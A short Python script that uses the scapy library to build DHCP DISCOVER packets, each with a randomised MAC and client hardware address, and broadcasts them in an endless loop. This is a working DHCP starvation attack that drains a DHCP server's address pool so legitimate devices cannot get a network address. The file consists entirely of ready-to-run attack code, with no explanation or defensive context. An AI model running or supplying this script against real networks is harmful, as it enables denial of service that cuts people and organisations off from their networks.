from scapy.all import *
import sys
import os
import time

dhcp_discover=Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/\
            IP(src="0.0.0.0", dst="255.255.255.255")/\
            UDP(sport=68, dport=67)/\
            BOOTP(chaddr=RandString(12, '0123456789abcdef'))/\
            DHCP(options=[("message-type", "discover"), "end"])
def run():
    try:
        sendp(dhcp_discover, loop=1)
    except KeyboardInterrupt:
        print "shutting down"
        sys.exit(1)